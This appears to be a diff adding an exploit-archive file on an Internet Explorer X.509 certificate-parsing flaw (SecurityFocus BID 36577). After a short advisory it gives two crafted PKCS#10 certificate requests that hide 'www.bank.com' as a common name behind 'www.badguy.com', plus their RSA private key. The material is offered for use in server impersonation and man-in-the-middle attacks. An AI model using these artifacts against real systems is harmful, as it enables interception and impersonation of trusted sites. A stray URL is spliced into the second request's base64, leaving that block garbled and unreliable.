@@ -1,0 +1,49 @@
+source: http://www.securityfocus.com/bid/36577/info
+
+Microsoft Internet Explorer is a browser available for Microsoft Windows.
+
+Internet Explorer is prone to multiple security-bypass vulnerabilities because it fails to properly handle encoded values in X.509 certificates. Specifically, it fails to properly distinguish integer sequences that are then recognized as CN (common name) elements.
+
+Successful exploits allow attackers to perform man-in-the-middle attacks or impersonate trusted servers, which will aid in further attacks. 
+
+PKCS#10 Request with Leading Zeroes:
+-----BEGIN CERTIFICATE REQUEST-----
+MIIBoTCCAQoCAQAwYTETMBEGA1UEChMKQmFkZ3V5IEluYzEXMBUGA1UEAxMOd3d3
+LmJhZGd1eS5jb20xGTAXBgNVBAsTEEhhY2tpbmcgRGl2aXNpb24xFjAUBgRVBIAD
+Ewx3d3cuYmFuay5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBANmLyxoJ
+hdDkywSs9J2E70fg5Z2Wou29jKgCDPSFBKTH6syTzWArF84mF4B7a/3aPaaSTwYQ
+43siBhDkqYAanZFiLcZS6KVB53/FSsJwzz4+CpDcl7ky5utF/6Yfv86408PpFJvv
+5FWLLYBjLkyKE7ru5aMQqqnlZQIHOZc06VIZAgMBAAGgADANBgkqhkiG9w0BAQQF
+AAOBgQAt9IeKCGIK6WZRP7tcuAZoQBWbxXpASRozSSRWa5GRpLigTb69tggy7kyH
+bVHsbR3uL5j9wObTaU0EzFLXRDW5R/fQy1SBJLo3S7VXKgSJisMP9rBbuUIgLK6f
+tlLl4l4l8jJhYPSYkXge1wmyuXVnte53XGy67mBubATzWRk40w==
+-----END CERTIFICATE REQUEST-----
+PKCS#10 Request with 64 Bit Overflow:
+-----BEGIN CERTIFICATE REQUEST-----
+MIIBqjCCARMCAQAwajETMBEGA1UEChMKQmFkZ3V5IEluYzEXMBUGA1UEAxMOd3d3
+LmJhZGd1eS5jb20xGTAXBgNVBAsTEEhhY2tpbmcgRGl2aXNpb24xHzAdBg1VBIKA
+gICAgICAgIADEwx3d3cuYmFuay5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJ
+AoGBANmLyxoJhdDkywSs9J2E70fg5Z2Wou29jKgCDPSFBKTH6syTzWArF84mF4B7
+a/3aPaaSTwYQ43siBhDkqYAanZFiLcZS6KVB53/FSsJwzz4+CpDcl7ky5utF/6Yf
+v86408PpFJvv5FWLLYBjLkyKE7ru5aMQqqnlZQIHOZc06VIZAgMBAAGgADANBgkq
+hkiG9w0BAQQFAAOBgQC5avxpz3cfAqmmi2JDAnYBEwzgZfjIAAldk5X8HAX7mB9/https://ww
+w.defcon.org/
+77neRquSA5VhUQ8K8tdVQylBoaengqQrNpcWu/mTagm0RNaq3fBT6g9hmaGOHjli
+zbuMfUaH5eMAubxxc04uHPcYShjFzTcIASG8jPJqwIM/CHsSBTG5VlJX8iFquA==
+-----END CERTIFICATE REQUEST-----
+Private Key For Above Requests:
+-----BEGIN RSA PRIVATE KEY-----
+MIICXgIBAAKBgQDZi8saCYXQ5MsErPSdhO9H4OWdlqLtvYyoAgz0hQSkx+rMk81g
+KxfOJheAe2v92j2mkk8GEON7IgYQ5KmAGp2RYi3GUuilQed/xUrCcM8+PgqQ3Je5
+MubrRf+mH7/OuNPD6RSb7+RViy2AYy5MihO67uWjEKqp5WUCBzmXNOlSGQIDAQAB
+AoGAGnnQ9hJCnvG5Y5BJFQKgvHa6eztiCN0QyUG2oeuubP+Hq+4xCIs2EnjAU3qx
+4es1pZgY1fwoM0wowNWTa2vR0S5Sse0cVFoEzgOUNDE3bGyRRatjjZEFq6Q1oH3Y
+MdW9B4bvFsU7wf6MbGmDWFGVMLmBfBlqnSMu324Nfm3xdAECQQDyuHD1XCEtHvcG
++SQnngLVs5d6nMnQsA06nEotBLrIe8QESmanOoSEtIsr25zNyUtr6QZqHaldOYK+
+SzWf+KWRAkEA5XLB/En3KtQWd+R/jmd8f8ef4IdbmAg+BChoayJPUbI2tyER97MV
+xAUPN1SujN5C4B+cCz79hXk2+W5dnrOACQJBALO815EqVzsFiiJ0zkw0G59KrarT
+fjN2m2VCpT8vGG4sEJyox9mgYM+wrrqcl0JghOR1HBXqvydU1je6lAxRYbECQQCE
+QIw9riiQgCTfQE6ht1aUlGy7z2llDUMpxFzDe8g6b72H+sDPhGMEVGI740ylF6t2
+YeHgvZMFryOXzBycUBx5AkEAibS/zSPs08ix6LIaRYsok692TTqb49Cg+FuhJsx/
+eEegf1tZTACaCETRB1+edTW20MDwZukGs0WnZ9axgs/9PA==
+-----END RSA PRIVATE KEY-----
